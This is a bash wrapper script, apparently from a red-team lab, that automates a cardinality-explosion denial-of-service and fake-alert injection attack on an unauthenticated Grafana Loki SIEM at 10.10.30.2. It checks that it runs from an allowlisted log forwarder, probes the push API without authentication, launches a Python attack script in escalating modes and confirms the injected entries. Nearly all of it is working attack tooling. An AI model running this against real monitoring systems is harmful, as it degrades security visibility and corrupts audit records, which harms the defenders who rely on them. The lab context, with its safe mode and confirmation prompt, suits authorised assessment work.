#!/bin/bash

# ==========================================================================
# === Loki Cardinality Explosion Attack Wrapper ===
#
# This script automates the execution of the Loki Cardinality PoC from
# a trusted endpoint (web_server) that has firewall allowlist access
# to the SIEM infrastructure.
#
# Attack Vector: Compromised Trusted Log Forwarder → Unauthenticated Loki
# Impact: Index explosion, storage exhaustion, SIEM denial of service
#
# Author: Red Team Assessment
# Date: 2025-11-28
# ==========================================================================

set -u  # Fail on undefined variables

# --- Script Directory ---
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# --- Configuration ---
# Trusted endpoint verification
TRUSTED_HOSTNAME="web_server"
TRUSTED_IP_PATTERN="10.10.10.4"       # DMZ interface of webserver
TRUSTED_MGMT_IP="10.10.60.3"          # Management interface

# Loki target (SIEM)
LOKI_HOST="10.10.30.2"
LOKI_PORT="3100"

# Attack script
ATTACK_SCRIPT="${SCRIPT_DIR}/python-scripts/loki_cardinality_attack.py"
ATTACK_SCRIPT_CONTAINER="/tmp/loki_cardinality_attack.py"

# Container names
WEBSERVER_CONTAINER="clab-security_lab-web_server"

# Log output
LOG_DIR="${SCRIPT_DIR}/logs"
TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
LOG_FILE="${LOG_DIR}/loki_attack_${TIMESTAMP}.log"

# Default attack parameters
DEFAULT_MODE="safe"
DEFAULT_ENTRIES=1000
DEFAULT_THREADS=4
DEFAULT_UNIQUE_PER_BATCH=50

# --- Colors ---
RED="\033[0;31m"
GREEN="\033[0;32m"
YELLOW="\033[0;33m"
BLUE="\033[0;34m"
CYAN="\033[0;36m"
MAGENTA="\033[0;35m"
NC="\033[0m"

# --- Banner ---
print_banner() {
    echo -e "${MAGENTA}"
    cat << 'EOF'
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                                                                   ║
    ║   ██╗      ██████╗ ██╗  ██╗██╗    ██████╗  ██████╗  ██████╗      ║
    ║   ██║     ██╔═══██╗██║ ██╔╝██║    ██╔══██╗██╔═══██╗██╔════╝      ║
    ║   ██║     ██║   ██║█████╔╝ ██║    ██║  ██║██║   ██║╚█████╗       ║
    ║   ██║     ██║   ██║██╔═██╗ ██║    ██║  ██║██║   ██║ ╚═══██╗      ║
    ║   ███████╗╚██████╔╝██║  ██╗██║    ██████╔╝╚██████╔╝██████╔╝      ║
    ║   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝    ╚═════╝  ╚═════╝ ╚═════╝       ║
    ║                                                                   ║
    ║         CARDINALITY EXPLOSION - SIEM DENIAL OF SERVICE            ║
    ║                   Trusted Endpoint Attack Vector                  ║
    ╚═══════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

# --- Logging Functions ---
log() {
    local level="$1"
    local message="$2"
    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
    echo -e "[${timestamp}] [${level}] ${message}" | tee -a "${LOG_FILE}" 2>/dev/null
}

log_info() {
    log "${BLUE}INFO${NC}" "$1"
}

log_success() {
    log "${GREEN}SUCCESS${NC}" "$1"
}

log_warning() {
    log "${YELLOW}WARNING${NC}" "$1"
}

log_error() {
    log "${RED}ERROR${NC}" "$1"
}

log_critical() {
    log "${RED}CRITICAL${NC}" "$1"
}

# --- Trusted Endpoint Verification ---
verify_trusted_endpoint() {
    echo -e "\n${CYAN}[*] Verifying Trusted Endpoint Status...${NC}\n"
    
    local is_trusted=false
    local verification_method=""
    
    # Method 1: Check if running inside the trusted container
    if [ -f /etc/hostname ]; then
        local current_hostname=$(cat /etc/hostname 2>/dev/null)
        if [[ "$current_hostname" == *"$TRUSTED_HOSTNAME"* ]]; then
            is_trusted=true
            verification_method="hostname match"
        fi
    fi
    
    # Method 2: Check IP address matches trusted endpoint
    if ! $is_trusted; then
        local current_ips=$(ip addr 2>/dev/null | grep -oE "inet [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | awk '{print $2}')
        for ip in $current_ips; do
            if [[ "$ip" == "$TRUSTED_IP_PATTERN" ]] || [[ "$ip" == "$TRUSTED_MGMT_IP" ]]; then
                is_trusted=true
                verification_method="IP address match ($ip)"
                break
            fi
        done
    fi
    
    # Method 3: Check if we're running via docker exec into the trusted container
    if ! $is_trusted; then
        # Check environment for container indicators
        if [[ "${HOSTNAME:-}" == *"web_server"* ]] || [[ -f /.dockerenv ]]; then
            # Additional check: can we reach Loki on the security network?
            if timeout 2 bash -c "echo > /dev/tcp/${LOKI_HOST}/${LOKI_PORT}" 2>/dev/null; then
                is_trusted=true
                verification_method="network access to SIEM (${LOKI_HOST}:${LOKI_PORT})"
            fi
        fi
    fi
    
    if $is_trusted; then
        log_success "Trusted Endpoint Verified: ${verification_method}"
        echo -e "  ${GREEN}✓${NC} Running on allowlisted trusted endpoint"
        echo -e "  ${GREEN}✓${NC} Firewall will permit traffic to SIEM network"
        return 0
    else
        log_critical "NOT running on trusted endpoint!"
        echo -e "  ${RED}✗${NC} This script must run from: ${TRUSTED_HOSTNAME}"
        echo -e "  ${RED}✗${NC} Expected IPs: ${TRUSTED_IP_PATTERN} or ${TRUSTED_MGMT_IP}"
        echo -e ""
        echo -e "${YELLOW}To run from trusted endpoint:${NC}"
        echo -e "  docker exec -it ${WEBSERVER_CONTAINER} /bin/bash"
        echo -e "  python3 ${ATTACK_SCRIPT_CONTAINER} --host ${LOKI_HOST} -m safe"
        return 1
    fi
}

# --- Verify Dependencies ---
verify_dependencies() {
    echo -e "\n${CYAN}[*] Verifying Dependencies...${NC}\n"
    
    local missing_deps=()
    
    # Check Python3
    if ! command -v python3 &>/dev/null; then
        missing_deps+=("python3")
    else
        log_success "Python3 available: $(python3 --version 2>&1)"
    fi
    
    # Check requests library
    if ! python3 -c "import requests" 2>/dev/null; then
        missing_deps+=("requests (pip3 install requests)")
    else
        log_success "Python 'requests' library available"
    fi
    
    # Check attack script exists (local or in container)
    if [ -f "${ATTACK_SCRIPT}" ]; then
        log_success "Attack script found: ${ATTACK_SCRIPT}"
    elif [ -f "${ATTACK_SCRIPT_CONTAINER}" ]; then
        log_success "Attack script found: ${ATTACK_SCRIPT_CONTAINER}"
        ATTACK_SCRIPT="${ATTACK_SCRIPT_CONTAINER}"
    else
        missing_deps+=("loki_cardinality_attack.py")
    fi
    
    if [ ${#missing_deps[@]} -gt 0 ]; then
        log_error "Missing dependencies: ${missing_deps[*]}"
        return 1
    fi
    
    return 0
}

# --- Verify Loki Connectivity ---
verify_loki_connectivity() {
    echo -e "\n${CYAN}[*] Verifying Loki Connectivity...${NC}\n"
    
    # Test TCP connectivity
    if timeout 5 bash -c "echo > /dev/tcp/${LOKI_HOST}/${LOKI_PORT}" 2>/dev/null; then
        log_success "TCP connection to ${LOKI_HOST}:${LOKI_PORT} successful"
    else
        log_error "Cannot reach Loki at ${LOKI_HOST}:${LOKI_PORT}"
        return 1
    fi
    
    # Test Loki /ready endpoint
    local ready_response=$(curl -s --connect-timeout 5 "http://${LOKI_HOST}:${LOKI_PORT}/ready" 2>&1)
    if [[ "$ready_response" == "ready" ]]; then
        log_success "Loki /ready endpoint: OK"
    else
        log_warning "Loki /ready returned: ${ready_response}"
    fi
    
    # Test Push API (unauthenticated access check)
    local push_test=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST \
        -H "Content-Type: application/json" \
        -d '{"streams":[{"stream":{"job":"auth_test"},"values":[["'$(date +%s)000000000'","test"]]}]}' \
        "http://${LOKI_HOST}:${LOKI_PORT}/loki/api/v1/push" 2>&1)
    
    if [[ "$push_test" == "204" ]] || [[ "$push_test" == "200" ]]; then
        log_critical "VULNERABILITY CONFIRMED: Push API accepts unauthenticated requests!"
        echo -e "  ${RED}!${NC} Loki has NO authentication enabled"
        echo -e "  ${RED}!${NC} Any trusted network endpoint can inject logs"
        return 0
    else
        log_info "Push API returned HTTP ${push_test}"
        return 0
    fi
}

# --- Run Attack ---
run_attack() {
    local mode="$1"
    local entries="$2"
    local threads="$3"
    local unique_per_batch="$4"
    local dry_run="$5"
    
    echo -e "\n${MAGENTA}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${MAGENTA}  LOKI CARDINALITY ATTACK - MODE: ${mode^^}${NC}"
    echo -e "${MAGENTA}════════════════════════════════════════════════════════════════${NC}"
    
    case "$mode" in
        safe)
            echo -e "${GREEN}  Mode: SAFE (Proof of Concept - 5 entries only)${NC}"
            echo -e "${GREEN}  Impact: Minimal - demonstrates access without damage${NC}"
            ;;
        cardinality)
            echo -e "${RED}  Mode: CARDINALITY EXPLOSION${NC}"
            echo -e "${RED}  Impact: Creates ${entries} entries across ~$((entries / 10)) unique streams${NC}"
            echo -e "${RED}  Effect: Index bloat, memory exhaustion, query degradation${NC}"
            ;;
        integrity)
            echo -e "${YELLOW}  Mode: DATA INTEGRITY ATTACK${NC}"
            echo -e "${YELLOW}  Impact: Injects ${entries} fake security alerts${NC}"
            echo -e "${YELLOW}  Effect: Alert fatigue, false positives, trust erosion${NC}"
            ;;
        full)
            echo -e "${RED}  Mode: FULL ATTACK (Cardinality + Integrity)${NC}"
            echo -e "${RED}  Impact: Combined index bloat AND fake security events${NC}"
            ;;
    esac
    
    echo -e "${MAGENTA}════════════════════════════════════════════════════════════════${NC}\n"
    
    # Build command
    local cmd="python3 ${ATTACK_SCRIPT} --host ${LOKI_HOST} --port ${LOKI_PORT} -m ${mode}"
    
    if [[ "$mode" != "safe" ]]; then
        cmd="${cmd} -n ${entries} -t ${threads} -u ${unique_per_batch}"
    fi
    
    if [[ "$dry_run" == "true" ]]; then
        echo -e "${YELLOW}[DRY-RUN] Would execute:${NC}"
        echo -e "  ${CYAN}${cmd}${NC}"
        echo ""
        log_info "[DRY-RUN] Command: ${cmd}"
        return 0
    fi
    
    log_info "Executing: ${cmd}"
    echo -e "${BLUE}[*] Starting attack...${NC}\n"
    
    # Execute attack
    eval "${cmd}" 2>&1 | tee -a "${LOG_FILE}"
    
    local exit_code=${PIPESTATUS[0]}
    
    if [ ${exit_code} -eq 0 ]; then
        log_success "Attack completed successfully"
    else
        log_error "Attack failed with exit code ${exit_code}"
    fi
    
    return ${exit_code}
}

# --- Verify Attack Results ---
verify_results() {
    local mode="$1"
    
    echo -e "\n${CYAN}[*] Verifying Attack Results...${NC}\n"
    
    # Query Loki for injected logs
    local query_label=""
    case "$mode" in
        safe)
            query_label="redteam_poc"
            ;;
        cardinality|full)
            query_label="application"
            ;;
        integrity)
            query_label="security_audit"
            ;;
    esac
    
    log_info "Querying Loki for injected entries (job=${query_label})..."
    
    local query_result=$(curl -s --connect-timeout 10 \
        "http://${LOKI_HOST}:${LOKI_PORT}/loki/api/v1/query_range?query=%7Bjob%3D%22${query_label}%22%7D&limit=5" 2>&1)
    
    if echo "$query_result" | grep -q '"values"'; then
        local entry_count=$(echo "$query_result" | grep -o '"values"' | wc -l)
        log_success "Found injected log entries in Loki (streams with data: ${entry_count})"
        echo -e "  ${GREEN}✓${NC} Log injection confirmed"
        
        # Show sample
        echo -e "\n${CYAN}Sample injected entry:${NC}"
        echo "$query_result" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    if data.get('data', {}).get('result'):
        stream = data['data']['result'][0]
        print(f\"  Labels: {stream.get('stream', {})}\" )
        if stream.get('values'):
            print(f\"  Sample: {stream['values'][0][1][:100]}...\")
except:
    pass
" 2>/dev/null
    else
        log_warning "Could not verify injected entries"
        echo -e "  ${YELLOW}?${NC} Query returned: ${query_result:0:100}..."
    fi
}

# --- Usage ---
usage() {
    echo -e "${CYAN}Loki Cardinality Explosion Attack Wrapper${NC}"
    echo ""
    echo -e "${CYAN}Usage:${NC} $0 [OPTIONS]"
    echo ""
    echo -e "${CYAN}Modes:${NC}"
    echo "  -m, --mode <mode>      Attack mode (default: safe)"
    echo "                         safe        - 5 PoC entries only (no damage)"
    echo "                         cardinality - Index explosion attack"
    echo "                         integrity   - Fake security alert injection"
    echo "                         full        - Combined attack"
    echo ""
    echo -e "${CYAN}Attack Options:${NC}"
    echo "  -n, --entries <num>    Number of entries to inject (default: ${DEFAULT_ENTRIES})"
    echo "  -t, --threads <num>    Parallel threads (default: ${DEFAULT_THREADS})"
    echo "  -u, --unique <num>     Unique label sets per batch (default: ${DEFAULT_UNIQUE_PER_BATCH})"
    echo ""
    echo -e "${CYAN}Control Options:${NC}"
    echo "  --dry-run              Show command without executing"
    echo "  --skip-verify          Skip trusted endpoint verification"
    echo "  --verify-only          Only verify connectivity, don't attack"
    echo "  -h, --help             Show this help message"
    echo ""
    echo -e "${CYAN}Examples:${NC}"
    echo "  $0 -m safe                           # Safe PoC (5 entries)"
    echo "  $0 -m cardinality -n 10000           # 10K entry cardinality attack"
    echo "  $0 -m cardinality -n 50000 --dry-run # Preview 50K attack command"
    echo "  $0 --verify-only                     # Just test connectivity"
    echo ""
    echo -e "${CYAN}Execution from Host:${NC}"
    echo "  docker cp ${ATTACK_SCRIPT} ${WEBSERVER_CONTAINER}:${ATTACK_SCRIPT_CONTAINER}"
    echo "  docker exec ${WEBSERVER_CONTAINER} $0 -m safe"
    echo ""
    exit 0
}

# --- Main ---
main() {
    local mode="${DEFAULT_MODE}"
    local entries="${DEFAULT_ENTRIES}"
    local threads="${DEFAULT_THREADS}"
    local unique_per_batch="${DEFAULT_UNIQUE_PER_BATCH}"
    local dry_run="false"
    local skip_verify="false"
    local verify_only="false"
    
    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -m|--mode)
                mode="$2"
                shift 2
                ;;
            -n|--entries)
                entries="$2"
                shift 2
                ;;
            -t|--threads)
                threads="$2"
                shift 2
                ;;
            -u|--unique)
                unique_per_batch="$2"
                shift 2
                ;;
            --dry-run)
                dry_run="true"
                shift
                ;;
            --skip-verify)
                skip_verify="true"
                shift
                ;;
            --verify-only)
                verify_only="true"
                shift
                ;;
            -h|--help)
                usage
                ;;
            *)
                log_error "Unknown option: $1"
                usage
                ;;
        esac
    done
    
    # Validate mode
    if [[ ! "$mode" =~ ^(safe|cardinality|integrity|full)$ ]]; then
        log_error "Invalid mode: ${mode}"
        usage
    fi
    
    # Create log directory
    mkdir -p "${LOG_DIR}"
    
    # Show banner
    print_banner
    
    echo -e "${YELLOW}Target: Loki SIEM at ${LOKI_HOST}:${LOKI_PORT}${NC}"
    echo -e "${YELLOW}Attack Mode: ${mode}${NC}"
    echo -e "${YELLOW}Log File: ${LOG_FILE}${NC}"
    
    # Step 1: Verify trusted endpoint (unless skipped)
    if [[ "$skip_verify" != "true" ]]; then
        if ! verify_trusted_endpoint; then
            echo -e "\n${RED}[!] Aborting: Not running on trusted endpoint${NC}"
            echo -e "${YELLOW}    Use --skip-verify to bypass (for testing only)${NC}\n"
            exit 1
        fi
    else
        log_warning "Trusted endpoint verification SKIPPED"
    fi
    
    # Step 2: Verify dependencies
    if ! verify_dependencies; then
        echo -e "\n${RED}[!] Aborting: Missing dependencies${NC}\n"
        exit 1
    fi
    
    # Step 3: Verify Loki connectivity
    if ! verify_loki_connectivity; then
        echo -e "\n${RED}[!] Aborting: Cannot reach Loki SIEM${NC}\n"
        exit 1
    fi
    
    # Exit if verify-only mode
    if [[ "$verify_only" == "true" ]]; then
        echo -e "\n${GREEN}[+] Verification complete. Target is accessible.${NC}"
        echo -e "${CYAN}    To execute attack: $0 -m ${mode}${NC}\n"
        exit 0
    fi
    
    # Step 4: Safety confirmation for destructive modes
    if [[ "$mode" != "safe" ]] && [[ "$dry_run" != "true" ]]; then
        echo -e "\n${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║  WARNING: DESTRUCTIVE ATTACK MODE                            ║${NC}"
        echo -e "${RED}╠══════════════════════════════════════════════════════════════╣${NC}"
        echo -e "${RED}║  Mode:    ${mode}${NC}"
        echo -e "${RED}║  Entries: ${entries}${NC}"
        echo -e "${RED}║  Effect:  May cause SIEM service degradation or failure      ║${NC}"
        echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        read -p "Type 'CONFIRM' to proceed: " confirmation
        
        if [[ "$confirmation" != "CONFIRM" ]]; then
            log_info "Attack cancelled by user"
            echo -e "${YELLOW}[!] Attack cancelled${NC}\n"
            exit 0
        fi
    fi
    
    # Step 5: Execute attack
    run_attack "$mode" "$entries" "$threads" "$unique_per_batch" "$dry_run"
    local attack_result=$?
    
    # Step 6: Verify results (unless dry-run)
    if [[ "$dry_run" != "true" ]] && [[ $attack_result -eq 0 ]]; then
        verify_results "$mode"
    fi
    
    # Summary
    echo -e "\n${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  Attack Complete${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "  Log file: ${LOG_FILE}"
    echo -e "  Verify in Loki: {job=\"redteam_poc\"} or {job=\"application\"}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}\n"
}

# Run main
main "$@"
